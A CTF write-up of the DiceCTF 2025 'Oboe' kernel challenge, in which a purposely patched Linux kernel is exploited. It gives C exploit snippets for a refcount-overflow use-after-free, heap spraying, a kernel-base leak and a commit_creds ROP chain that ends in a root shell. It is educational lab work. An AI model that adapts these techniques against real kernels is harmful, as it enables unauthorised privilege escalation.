+++
title = 'Dice 2025 Oboe'
date = 2026-08-27T10:24:02+02:00
tags = ["pwn", "Kernel"]
categories = ["Dice"]
+++

**Challenge Name : Oboe**   
**Number of solves : 16**

This post is a writeup of a challenge of last year DiceCTF, that I recently solved.   
Oboe was a Linux Kernel challenge, during the CTF it was solved by 16 people. It was a really nice challenge so I thought I'd make a writeup of it.
You can find the files of the challenge [here](https://github.com/Ret2skillz/CTFs/blob/main/Dice2025/Oboe/) (note: the bzImage to use with **run** is bzImage.backup and the other bzImage need kernel source in the folder used). 

## TLDR ##
- The challenge is a patch of kernel v 6.13.8
- Adds an off-by-one on struct unix_addr in unix_create_addr and a BOF
- The off-by-one can be used to overflow into unix_addr refcnt thus create UAF
- Spray a bunch of structs to then have adjacent structs
- Allocate two adjacents A and B chunks, and allocate shm_file objects after B
- Make an accept connection on B so its refcnt will be 2
- Free A
- Allocate an object bigger than A filled with \x01 to make sure A last byte will be 1
- Reallocate A while using off-by-one => make B refcnt be 1
- Close B connection => refcnt goes to 0 => UAF
- Allocate setxattr on B to modify its length allowing us to leak kbase with shm objects after B chunk
- Redo the whole UAF this time to get the BOF
- Control RIP with a ropchain that calls commit_creds(init_cred)

## Debug Setup and Config
First of all let's talk about the debugging setup. The challenge provide us with a patch and their config. The config basically make our life easier in the kernel heap by removing freelist randomisation and freelist hardened, as for the security the most important are SMEP and SMAP and of course kASLR. SLUB is used.  

For the debugging setup the steps are:  
1. Download kernel source for our version 6.13.8
2. Apply the patch and config to it
3. There is some custom patches with sed we need to do too
4. Make our life easier by adding all the debugging scripts and symbols we need
5. Compile  

The below commands will do all that.
```bash
# Download and extract 
wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.13.8.tar.xz 
tar -xf linux-6.13.8.tar.xz 
cd linux-6.13.8 

# Apply the vuln patch 
patch -p1 < af_unix.c.patch 

# Apply the sed patches 
sed -i '0,/BUG/s/BUG/\/\/BUG/' net/socket.c 
sed -i '0,/gets/{/gets/s/^/__attribute__((no_stack_protector)) /}' net/socket.c 

# Copy the provided config 
cp /path/to/kconfig .config 

# Flip debug options 
scripts/config --disable DEBUG_INFO_NONE 
scripts/config --enable DEBUG_INFO_DWARF5 
scripts/config --enable GDB_SCRIPTS 
scripts/config --enable FRAME_POINTER 

# Sync config (accept defaults for any new options) 
make olddefconfig 

# Compile (adjust -j to your core count) 
make -j$(nproc)
```
After that you can use the newly compiled bzImage and the vmlinux present in the source folder. In the files of the challenge there is also a **debug.sh** that launch all the setup for debugging, while also adding our exploit on the shell we get. Also disables ASLR to make it more convenient while testing exploit.  
Now you can simply launch **gdb ./vmlinux** and attach to port 1234.  

With this setup we will have all the symbols present in gdb and also be able to follow the C code and not just disassembly in gdb which makes life way easier. As always I use the gef from bata24 which adds lot of useful commands for the kernel.

## Patch analysis
The challenge provide us with a patch file named af_unix.c.patch
```C
--- a/net/unix/af_unix.c
+++ b/net/unix/af_unix.c
@@ -325,7 +325,7 @@
 
 	refcount_set(&addr->refcnt, 1);
 	addr->len = addr_len;
-	memcpy(addr->name, sunaddr, addr_len);
+	memcpy(addr->name, sunaddr, addr_len + 1);
 
 	return addr;
 }
```
It patch lines 325 in af_unix.c. Obviously it adds an off-by-one in the memcpy by adding + 1 to the length. So now we should look at af_unix.c to see what's the function patched.
```C
static struct unix_address *unix_create_addr(struct sockaddr_un *sunaddr,
					     int addr_len)
{
	struct unix_address *addr;

	addr = kmalloc(sizeof(*addr) + addr_len, GFP_KERNEL);
	if (!addr)
		return NULL;

	refcount_set(&addr->refcnt, 1);
	addr->len = addr_len;
	memcpy(addr->name, sunaddr, addr_len);

	return addr;
}
```
The function takes a struct sockadddr_un and len in inputs. It allocates a unix_address on the heap, increase its refcnt before copying the sunaddr in addr->name. So we get an off-by-one in addr->name. We can call the function with bind. In this case the next thing to do is to look at both structures to understand them. First starting with the sockaddr_un.
```C
struct sockaddr_un {
	__kernel_sa_family_t sun_family; /* AF_UNIX */
	char sun_path[UNIX_PATH_MAX];	/* pathname */
};
```
SO it just takes the AF_UNIX and pathname, we should next look at the unix_address which is the real interesting structure.
```C
struct unix_address {
	refcount_t	refcnt;
	int		len;
	struct sockaddr_un name[];
};
```
It starts with a refcnt (4 bytes), the len, and then the name which is our sockaddr_un. So with the off-by-one we can overwrite the first byte of whatever was allocated after our unix_address.

## Second patch
There is also a custom patch made with sed commands in the linux.dockerfile 
```
RUN sed -i '0,/BUG/s/BUG/\/\/BUG/' net/socket.c
RUN sed -i '0,/gets/{/gets/s/^/__attribute__((no_stack_protector)) /}' net/socket.c
```
It comments out the first line that has BUG in net/socket.c. It also removes the canary for the first function that has gets. So basically it strongly hint at giving us a Stack Buffer Overflow. 

The first function affected is **mov_addr_to_user**
```C
static int move_addr_to_user(struct sockaddr_storage *kaddr, int klen,
			     void __user *uaddr, int __user *ulen)
{
	int err;
	int len;

	BUG_ON(klen > sizeof(struct sockaddr_storage));
	err = get_user(len, ulen);
	if (err)
		return err;
	if (len > klen)
		len = klen;
	if (len < 0)
		return -EINVAL;
	if (len) {
		if (audit_sockaddr(klen, kaddr))
			return -ENOMEM;
		if (copy_to_user(uaddr, kaddr, len))
			return -EFAULT;
	}
	/*
	 *      "fromlen shall refer to the value before truncation.."
	 *                      1003.1g
	 */
	return __put_user(klen, ulen);
}
```
So basically it removes a check about the len, giving us the possibility of having a very large len. Meaning we will get a potential Buffer Overflow if the len is corrupted or a potential OOB read.

Second function affected is the one calling the above.
```C
int __sys_getsockname(int fd, struct sockaddr __user *usockaddr,
		      int __user *usockaddr_len)
{
	struct socket *sock;
	struct sockaddr_storage address;
	CLASS(fd, f)(fd);
	int err;

	if (fd_empty(f))
		return -EBADF;
	sock = sock_from_file(fd_file(f));
	if (unlikely(!sock))
		return -ENOTSOCK;

	err = security_socket_getsockname(sock);
	if (err)
		return err;

	err = READ_ONCE(sock->ops)->getname(sock, (struct sockaddr *)&address, 0);
	if (err < 0)
		return err;

	/* "err" is actually length in this case */
	return move_addr_to_user(&address, err, usockaddr, usockaddr_len);
}
```
So getsockname is the function we can use to read from our object, it will then call move_addr_to_user. So if we corrupt the len of our unix_address object we can either gain an OOB read, or if we increase the size enough get Overflow and since we don't care about a canary we will be able to control RIP.

## The actual vulnerability
To understand the vulnerability a brief explanation of what the refcnt is.  
It's a counter that tells the kernel if an object is in use or not. It can be increased if an object is used more than once (think in our case a connection with bind that we would then call accept on).  
But if it goes to 0 it tells the kernel that the object is no longer in use, so it will get freed.  

In our case if we can get an off-by-one on the next unix_address we could overflow in its refcnt and create a UAF.

## Requirements for the exploit
The first problem we have is that the memcpy just takes whatever is on the stack after the bytes of our object. Meaning normally we don't control what the overflow byte is.  
Also, we can't just simply overflow a null byte into refcnt. In this case since the refcnt didn't drop to 0 normally, if we try to then free it the kernel will just see a problem. We need to make it drop naturally to 0 by closing a connection while still keeping a reference to our object.  

For the second problem, what we can do is increase the refcnt to 2 by using accept on our bind connection. Then we overflow with a \x01 byte setting victim object refcnt to 1. Then we free victim object => refcnt goes to 0 we get a UAF since our bind connection still references it.  

For the second problem, memcpy copies all bytes from the stack: however it's always the bytes of one of the object we created and from the same address. So what we can do is create a big object filled with only \x01 bytes (actually we can just put those bytes at the offset of overflow but way more convenient to just fill it). Hopefully the bytes will stay on the stack when we do the overflow and gives us a reliable off-by-one with \x01.

## First stage of the exploit
For our exploit to work we want to have consecutive allocations that we can use reliably. For this (like every kernel challenge/PoC I guess) we will start by spraying tons of our object. I used to put them in kmalloc-32 cause that gives us nice objects later for leaking.
```C
// phase 1: allocate all sockets first
    for (int i = 0; i < SPRAY; i++) {
        spray_fds[i] = socket_addr();
        if (spray_fds[i] < 0) { perror("socket"); return -1; }
    }

    for (int i = 0; i < SPRAY; i++) {
        bind_addr(spray_fds[i], i, ADDR_LEN-1, NAME_LEN); // -1 to not overflow now
    }

    printf("sprayed bunch of unix addresses\n");
```
Then our next objects will be allocated adjacent to each other. What we want is chunk A (the one who will overflow) just before chunk B (the victim).
```C
int fd_a;
    int fd_b;

    fd_a = socket_addr();
    fd_b = socket_addr();
    bind_addr(fd_a, 121, ADDR_LEN-1, NAME_LEN);
    bind_addr(fd_b, 122, ADDR_LEN-1, NAME_LEN);

    printf("Allocated two adjacent address\n");
```
Then we make an accept connection over fd B so that we increase B refcnt to be 2.
```C
listen(fd_b, 1);

    int client = socket(AF_UNIX, SOCK_STREAM, 0);

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    addr.sun_path[0] = '\0';
    memset(addr.sun_path + 1, 'a', NAME_LEN - 1);
    addr.sun_path[1] = (122 >> 8) & 0xff;
    addr.sun_path[2] = 122 & 0xff;

    connect(client, (struct sockaddr *)&addr, ADDR_LEN - 1);

    int accepted = accept(fd_b, NULL, NULL);

    printf("B refcnt = 2\n");
```
Then what we do is free A, before reclaiming it we allocate a big object filled with \x01 bytes. Then we reclaim 1 with overflow and hopefully it will overflow into B with the byte we want putting B refcnt to 1. Finally we close B so that it is freed and we gain our UAF.
```C
int fd_a_new = socket_addr();
    close(fd_a);
    for (volatile int i = 0; i < 1000000; i++);
    printf("normally making sure unix_address A is freed\n");
    getchar();
    controlled_off_by_one(201);
    bind_addr(fd_a_new, 121, ADDR_LEN, NAME_LEN);

    //higher likelihood cause of our \x1 connection however highely random
    printf("Overflowed 1 into B refcnt\n");
    getchar();
    //this close one of our connection so free B while fd_b still reference it UAF
    close(accepted);
    close(client);
    for (volatile int i = 0; i < 1000000; i++);
    printf("now closed accepted conn => UAF on B\n");
```

## Gaining a leak
For gaining a leak we can use the interesting kernel objects listed on ptr-yudai [blog](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628).  
In our case for kmalloc-32 the two objects are shm_file and seq_operations.
```C
struct shm_file_data {
	int id;
	struct ipc_namespace *ns;
	struct file *file;
	const struct vm_operations_struct *vm_ops;
};

struct seq_operations {
	void * (*start) (struct seq_file *m, loff_t *pos);
	void (*stop) (struct seq_file *m, void *v);
	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
	int (*show) (struct seq_file *m, void *v);
};
```
However, as we can see they both messes up the len of our object.
shm_file_data would put it to 0 (cause of the padding after the id). And seq_operations would overwrite both refcnt and len with an address making our len huge. Both also gives us no control over the actual len.  

However, since we can have an OOB read, what we will do is allocate our shm_file_data (note that I use shm cause it's simply the first in the blog but seq_operations would be as useful) after our B chunk. Then we can modify our B len by using a setxattr over it, which gives us full control of the len we can put and keeping refcnt intact.  
By making the len 0x40 we will be able to read the shm_file_data right after our B chunk which can gives us kernel base => ktext leak.  

We can also start by reading our object which gives us heap leak cause of the freed ptr (not really useful actually).
```C
    uint64_t heap_leak = read_addr(fd_b, 6); // gain heap leak
    printf("HEAP LEAK : 0x%016lx\n", heap_leak);

    uint64_t kheap_base = heap_leak - 0x4381160;

    shm_t shm1 = create_shm();
    shm_t shm2 = create_shm();
    unsigned int buf[16] = { 1, 0x40 };  // offset 4 = 0x40 = fake len
    setxattr("/proc/self/stat", "toto", buf, 0x20, 0);
    getchar();

    uint64_t leak = read_addr(fd_b, 30);

    printf("0x%016lx\n", leak);

    uint64_t kbase = leak - 0x1bc5200;
    printf("Kernel BASE @ 0x%016lx\n", kbase);

    uint64_t commit_creds = kbase + COMMIT_CREDS;
    uint64_t prepare_kernel_cred = kbase + PREPARE_KERNEL_CRED;
    uint64_t init_task = kbase+INIT_TASK;
    uint64_t init_cred = kbase+0x01a52d00;
    uint64_t swapgs = kbase+0xf43a08; //simple swapgs // swapgs_restore_regs_and_return_to_usermode // common_interrupt_return
    uint64_t setuid = kbase+0xa6c20; //__sys_setuid
    uint64_t modprobe = kbase+0x01b44ca0;
    uint64_t core_pattern = kbase+0x1b7bc20;
    uint64_t iretq = kbase+0x10016ca;
    //note that i don't use half of those leaks in the exploit lol mostly cause of failed strats
```

## Gaining RIP Control
Now what we need to do is modify the len to Overflow and put our ropchain at the offset of RIP.  
The problem is trying to free and reallocate setxattr on B does not work.  
Second problem is in any case 0x20 objects are too short to use efficiently for a ROP chain.

We will need to do the whole UAF strategy again and this time on a bigger object. I chose to allocate kmalloc-96 objects (actually kmalloc-128 might have been easier but whatever).  

The next problem is the first 8 bytes of our object are not controllable since it's our refcnt and len, and the next 8 bytes contain null bytes. Meaning for our ROP chain to work we will need to jump over the first 0x10 bytes of any next object.  

With kmalloc-96 objects RIP offset is at the very end of an object, so our first gadget will need to jump at next chunk+0x10 which contain the rest of our payload.

Last thing is, while debugging I found the rsb of last 8 bytes of our chunk was almost always a null byte, which makes it unusable in our ropchain.

Another last constraint, the stack where our ROPchain will be is limited in size: we can't make our ROPchain too big. It's even more limited since there is some retaddr on the stack after our payload that won't get overwritten, so we need to finish our payload above it.

## ROPGadget is not your Friend
Normally when you want to ROP, you fire ROPgadget and look at the useful gadgets, on kernel making sure they are from executable memory. Well let me tell you that ROPGadget sucks.  

See above how I mentioned that the last 8 bytes of our chunk were unusable, well that's because with ROPgadget the only add rsp gadgets I could see where : ret 0x20, ret 0x10, etc...

The problem is that a ret 0x20 ROPchain need be in form  
ret 0x20  
next gadget  
padding  
continue payload

Meaning we would need to have a gadget on the last 8 bytes of the chunk which is not reliable. We need an add rsp, 0x20 gadget that ROPgadget couldn't find.  

Thankfully there are better and far more reliable ways to find gadgets. One of them being good old gdb. We can simply search for the bytes of instructions of a gadget we want in the executable memory range. 

It's like this that I find all the useful gadgets (literally all the gadgets I found weren't reliably found by ROPGadget). The following command can do that.
```
find /b 0xffffffff81000000, 0xffffffff82200000, 0x48,0x83,0xc4,0x20,0xc3

#just change bytes based on gadget we want to find
# above will find add rsp, 0x20 ; ret
```

## Failed attempts
Besides the failed attempts cause by the useless ret 0x20 gadget of ROPgadget, I tried several failed roads to gain a shell.

First I did the good old commit_creds(kernel_prepare_cred(0)). Except we are blocked from using 0 and kernel_prepare_cred with &init_task is useless anyway.

I then tried the modprobe_path way : it won't work, because the config overwrite what we put in there.

So then I used the more often used core_pattern. The idea is to overwrite it with |/cmd. Then making a program crash so that it does a coredump and calls the cmd. However, it didn't work. I'm not so sure why actually, as in gdb I could see it would take the path of my cmd on a crash but eventually seemed to not really execute it. I didn't try to debug longer to udnerstand the exact mechanism and just removed core_pattern from the list of possibilities.

After some thoughts and thinking about overwriting poweroff, I finally came to the actual way, which is actually the easiest, especially in terms of our ROPchain.

We can simply call **commit_creds(init_cred)**, then we simply need swapgs and iretq to return to userland. Iretq need on the stack : address of our shell, saved_cs, saved_rflags, saved_rsp, saved_ss.

Note that using system for the shell will segfault (cause of alignement I guess), but if we use execve it will not. Following code is the shell function and the final ROPchain.
```C
void shell(void) {
    puts("[+] returned to user land");

    if (getuid() != 0) {
        puts("[!] failed to get root");
        exit(1);
    }

    puts("[+] got root");
    puts("[*] spawning shell");

    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    execve("/bin/sh", argv, envp);

    perror("execve");
    exit(1);
}

    uint8_t p1[61 + 24]; 
    memset(p1, 0x62, 61); // put our ROPchain at right offset for RIP
    memcpy(p1 + 61, &esp_add, sizeof(uint64_t)); // useless previous failed attempt
    memcpy(p1 + 61+8, &add_rsp_x20, sizeof(uint64_t)); //jmp over next chunk
    memcpy(p1+ 61+0x10, &pop_rdi, sizeof(uint64_t)); // previous ret 0x20 fail

    uint8_t p2[48+21]; 
    //previous fails where my gadget moved a dword
    //in gdb found a move qword gadget
    uint64_t first  = 0x706d742fULL;  // 2f 74 6d 70 = /tmp
    uint64_t second = 0x0078782fULL;  // 2f 78 78 00 = /xx\x00
    uint64_t path = 0x00782f706d742f7cULL;
    uint64_t shell_addr = (uint64_t)shell;

    uint64_t first_addr = modprobe + 0x39;
    uint64_t second_addr = modprobe+0x39+4;
    
    memset(p2, 0x63, 13);//skip first bytes
    memcpy(p2+13, &pop_rdi, sizeof(uint64_t));
    memcpy(p2+21, &init_cred, sizeof(uint64_t));
    memcpy(p2+21+0x8, &commit_creds, 8);
    memcpy(p2+21+0x10, &swapgs, sizeof(uint64_t));
    memcpy(p2+21+0x18, &ret, sizeof(uint64_t)); //for alignement to skip next chunk 0x10 first bytes
    memcpy(p2+21+0x20, &ret_x20, sizeof(uint64_t));//this time i use ret0x20 cause i think otherwise I ran out of stack space
    memcpy(p2+21+0x28, &iretq, sizeof(uint64_t));//will call iretq that will use the gadget at the next chunk
    //still have place for three things in this chunk
    //now we do p3 which has the last payload for the script in tmp and the ret2userland
    
    uint8_t p3[40+5];
    memset(p3, 0x63, 5);
    //all the values we need for iretq
    memcpy(p3+5, &shell_addr, sizeof(uint64_t));
    memcpy(p3+5+0x8, &user_cs, sizeof(uint64_t));
    memcpy(p3+5+0x10, &user_rflags, sizeof(uint64_t));
    memcpy(p3+5+0x18, &user_rsp, sizeof(uint64_t));
    memcpy(p3+5+0x20, &user_ss, sizeof(uint64_t));
```
So in the end we redo the whole UAF mechanism on kmalloc-96 objects, with objects filled with our ROPchain. We allocate then 5 consecutive gadgets.  
A is the gadget overflowing into B for UAF  
B is the victim gadget that we change the len with setxattr for BOF  
C is at the end the offset to RIP => we put the add rsp, 0x20 there  
D has the actual ROPchain  
E has the values used by iretq  

## Conclusion
Oboe was a very nice challenge. As always in kernel chals the vulnerability is easy, but the exploitation nicely required to think about every steps needed to do what we want. In this case debugging could nicely make me go to the right step, and I learned a lot from the failed attemps and paths.  
Also after finishing the challenge, I found it was listed on a nice [repo](https://github.com/mito753/Kernel-Exploit-Dojo) of linux challenges: it's listed as medium-high in difficulty which seems fair.  

The repo is a very nice ressources if you want to use chals to train on kernel exploit. I would advise to not look at the columns after the difficulty as they "leak" the intended paths. However if you get stuck for very long on a challenge they offer nice hints without giving full solution. Could have helped in my case, tho I didn't spend more than 2 days on the chal and would have lost me opportunity to learn by mistakes and debug. But If you get stuck for days at some point I'd advise on looking at the column you need to unlock the next step (aka the bug, the primitive or the final step).  

Maybe for the next challenge I'll take some chal from this repo.

